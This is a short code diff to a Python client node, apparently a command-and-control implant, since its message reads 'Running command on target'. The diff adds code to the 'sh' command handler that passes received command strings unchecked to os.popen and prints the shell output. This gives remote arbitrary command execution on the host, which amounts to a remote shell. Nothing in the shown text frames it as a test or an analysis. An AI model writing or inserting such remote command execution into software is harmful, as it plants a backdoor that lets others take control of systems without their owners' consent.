@@ -3,6 +3,7 @@ __date__    = '16 November 2023'
 __version__ = '0.1.1'
 
 import binascii
+import os
 import socket
 import yaml
 
@@ -58,6 +59,8 @@ def run_command(command: list) -> bool:
         # necessary
         case ["sh", *commands]:
             print(f"Running command on target: " + ', '.join(commands) + ".")
+            shell_output = os.popen(' '.join(commands)).read()
+            print(shell_output)
         case ["quit", *extra]:
             print(f"Received the [quit, extra] command, ending client node.")
             return False
